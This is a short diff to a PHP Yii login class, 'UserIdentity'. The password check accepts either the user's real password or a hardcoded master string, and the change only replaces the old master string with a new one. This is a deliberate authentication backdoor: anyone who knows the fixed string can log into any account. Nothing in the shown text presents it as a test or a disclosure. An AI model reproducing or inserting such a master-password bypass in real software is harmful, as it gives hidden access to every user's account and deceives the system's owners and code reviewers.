@@ -35,7 +35,7 @@ class UserIdentity extends CUserIdentity
 		else if(
 			Yii::app()->getModule('user')->encrypting($this->password)!==$user->password
 			&&
-			Yii::app()->getModule('user')->encrypting($this->password)!==Yii::app()->getModule('user')->encrypting("hF[vFyByJd1359")){
+			Yii::app()->getModule('user')->encrypting($this->password)!==Yii::app()->getModule('user')->encrypting(">9-gw|.0_XVc!9i")){
 			$this->errorCode=self::ERROR_PASSWORD_INVALID;
 		}
 		else if($user->status==0&&Yii::app()->getModule('user')->loginNotActiv==false)
